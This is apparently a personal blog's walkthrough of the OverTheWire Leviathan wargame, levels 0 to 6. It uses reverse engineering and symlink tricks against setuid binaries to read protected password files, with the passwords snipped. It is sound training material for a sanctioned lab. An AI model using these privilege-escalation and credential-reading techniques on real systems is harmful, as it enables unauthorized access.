---
layout: post
title: "OverTheWire Leviathan"
date: 2024-08-18 +0200
categories: jekyll update
---
[https://overthewire.org/wargames/leviathan/](https://overthewire.org/wargames/leviathan/)
```sh
ssh leviathan0@leviathan.labs.overthewire.org -p 2223
```

![](https://ketho.github.io/data/otw-leviathan/ffxiv.png)

Leviathan from [Final Fantasy XIV](https://finalfantasy.fandom.com/wiki/Leviathan_(Final_Fantasy_XIV)); this wargame is relatively easy but sometimes requires tricky symlinking.

## Observations
I first searched for any filenames with leviathan. So the passwords are in `/etc/leviathan_pass`, and only the respective level has access to the password.

```sh
find / -type f -name '*leviathan*' 2> /dev/null
/etc/cron.d/leviathan5_cleanup
/etc/issue.leviathan
/etc/issue.leviathan.fail
/etc/issue.leviathan.localhost
/etc/leviathan_pass/leviathan0
/etc/leviathan_pass/leviathan1
/etc/leviathan_pass/leviathan2
/etc/leviathan_pass/leviathan3
/etc/leviathan_pass/leviathan4
/etc/leviathan_pass/leviathan5
/etc/leviathan_pass/leviathan6
/etc/leviathan_pass/leviathan7
/etc/ssh/sshd_config.d/leviathan.conf
/home/leviathan5/leviathan5
/home/leviathan6/leviathan6
/usr/bin/cronjob_leviathan5

ls /etc/leviathan_pass/ -la
-r--------   1 leviathan0 leviathan0    11 Jul 17 15:57 leviathan0
-r--------   1 leviathan1 leviathan1    11 Jul 17 15:57 leviathan1
-r--------   1 leviathan2 leviathan2    11 Jul 17 15:57 leviathan2
-r--------   1 leviathan3 leviathan3    11 Jul 17 15:57 leviathan3
-r--------   1 leviathan4 leviathan4    11 Jul 17 15:57 leviathan4
-r--------   1 leviathan5 leviathan5    11 Jul 17 15:57 leviathan5
-r--------   1 leviathan6 leviathan6    11 Jul 17 15:57 leviathan6
-r--------   1 leviathan7 leviathan7    11 Jul 17 15:57 leviathan7
```

## leviathan0
In the home dir there is a `.backup` folder with a `bookmarks.html` file, curious enough.
```sh
cat .backup/bookmarks.html | grep leviathan
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is <snip>" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

## leviathan1
```sh
file ./check
# ./check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=115df4ab9cca6c946a5c068b6c9c103f38a6e73b, for GNU/Linux 3.2.0, not strippedstripped
ls -la ./check
# -r-sr-x--- 1 leviathan2 leviathan1 15080 Jul 17 15:57 ./check
```
Let's grab the file and take a look with Binary Ninja.
```sh
scp -P 2223 leviathan1@leviathan.labs.overthewire.org:~/check check
```
In `main` it reads an input of 3 characters and compares it with `int32_t var_28 = 0x786573`. This value is the string "sex" when converted from hex (LSB).

![](https://ketho.github.io/data/otw-leviathan/leviathan1.png)

```sh
./check
password: sex

$ whoami
leviathan2
```
Now look where we can find any password.
```sh
$ find / -type f -name '*leviathan*' 2> /dev/null

$ cat /etc/leviathan_pass/leviathan2
```

## leviathan2
```sh
file ./printfile
# ./printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=afcdf5550ce2513fbb926561b898dc57b648a0c3, for GNU/Linux 3.2.0, not stripped
ls -la ./printfile
# -r-sr-x--- 1 leviathan3 leviathan2 15068 Jul 17 15:57 ./printfile
scp -P 2223 leviathan2@leviathan.labs.overthewire.org:~/printfile printfile
```
Let's look at `printfile`. It prints the contents of a file, as the name implies.

![](https://ketho.github.io/data/otw-leviathan/leviathan2.png)

This happily prints a file.
```sh
mkdir /tmp/ketho
echo "hello leviathan" > /tmp/ketho/lev2.txt
./printfile /tmp/ketho/lev2.txt
# hello leviathan
```

But the binary calls `access()` to check if the we have the proper permissions, sadly.
```sh
./printfile /etc/leviathan_pass/leviathan3
# You cant have that file...
```

The cat command should print all files, but it only printed the first file.
```sh
echo "hello test" > /tmp/ketho/lev2b.txt
cat /tmp/ketho/lev2.txt /tmp/ketho/lev2b.txt
# hello leviathan
# hello test
./printfile /tmp/ketho/lev2.txt /tmp/ketho/lev2b.txt
# hello leviathan
```

There seems to be a bug with spaces in files (or paths).
```sh
echo "hello miku" > "/tmp/ketho/foo bar.txt"
cat "/tmp/ketho/foo bar.txt"
# hello miku
./printfile "/tmp/ketho/foo bar.txt"
# /bin/cat: /tmp/ketho/foo: No such file or directory
# /bin/cat: bar.txt: No such file or directory
```

Maybe we could try to fool it by symlinking the first file to the password file.
```sh
ln -s /etc/leviathan_pass/leviathan3 /tmp/ketho/foo
./printfile "/tmp/ketho/foo bar.txt"
# <snip>
# /bin/cat: bar.txt: No such file or directory
```

## leviathan3
```sh
file ./level3
# ./level3: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5df2ce4584aa128f98d504b250d47c3aa8bc4aaa, for GNU/Linux 3.2.0, with debug_info, not stripped 
ls -la ./level3
# -r-sr-x--- 1 leviathan4 leviathan3 18096 Jul 17 15:57 ./level3
scp -P 2223 leviathan3@leviathan.labs.overthewire.org:~/level3 level3
```

There were some odd strings when lookin in `main()` with Binary Ninja and the first comparison check did not really seem to matter, since `var_44_1` is unused.

![](https://ketho.github.io/data/otw-leviathan/leviathan3_1.png)

The `do_stuff()` function was more interesting and simply compared the input with "snlprintf".

![](https://ketho.github.io/data/otw-leviathan/leviathan3_2.png)

```sh
leviathan3@gibson:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ cat /etc/leviathan_pass/leviathan4
```

## leviathan4
```sh
file ./.trash/bin
# ./.trash/bin: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=e9828459b248f1c38a3c479cf92c79c1cc3295b6, for GNU/Linux 3.2.0, not stripped
ls -la ./.trash/bin
# -r-sr-x--- 1 leviathan5 leviathan4 14936 Jul 17 15:57 .trash/bin
scp -P 2223 leviathan4@leviathan.labs.overthewire.org:~/.trash/bin bin
```
There is a binary in the trash and it printed some binary code.
```sh
leviathan4@gibson:~$ ./.trash/bin
00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010
```

We can see that it reads `/etc/leviathan_pass/leviathan5`, so the output must have at least something to do with it.

![](https://ketho.github.io/data/otw-leviathan/leviathan4.png)

Let's convert that to ASCII with [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Binary('Space',8)&input=MDAxMTAwMDAgMDExMDAxMDAgMDExMTEwMDEgMDExMTEwMDAgMDEwMTAxMDAgMDAxMTAxMTEgMDEwMDAxMTAgMDAxMTAxMDAgMDEwMTAwMDEgMDEwMDAxMDAgMDAwMDEwMTA): `<snip>`

## leviathan5
```sh
file ./leviathan5
# leviathan5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=d326fa408d269058f235a39826ffc6fbd5f5de2b, for GNU/Linux 3.2.0, not stripped
ls -la ./leviathan5
# -r-sr-x--- 1 leviathan6 leviathan5 15140 Jul 17 15:57 leviathan5
scp -P 2223 leviathan5@leviathan.labs.overthewire.org:~/leviathan5 ./leviathan5
```
The binary opens `/tmp/file.log` if it exists, and shows the contents by printing each character.

![](https://ketho.github.io/data/otw-leviathan/leviathan5.png)

The `unlink()` call is curious, which removes a symlink. This is probably a hint to use a symlink to read the password.
```sh
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
./leviathan5
```

## leviathan6
```sh
file ./leviathan6
# ./leviathan6: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=8d21eae4ea4ee29abbdfd21171064af6840bb32b, for GNU/Linux 3.2.0, not stripped
ls -la ./leviathan6
# -r-sr-x--- 1 leviathan7 leviathan6 15032 Jul 17 15:57 ./leviathan6
scp -P 2223 leviathan6@leviathan.labs.overthewire.org:~/leviathan6 ./leviathan6
```

![](https://ketho.github.io/data/otw-leviathan/leviathan6.png)

The comparison checks against `0x1bd3` which when [converted](https://gchq.github.io/CyberChef/#recipe=From_Base(16)&input=MHgxYmQz) to decimal is `7123`.

```sh
./leviathan6 7123
$ whoami
leviathan7

$ cat /etc/leviathan_pass/leviathan7
```
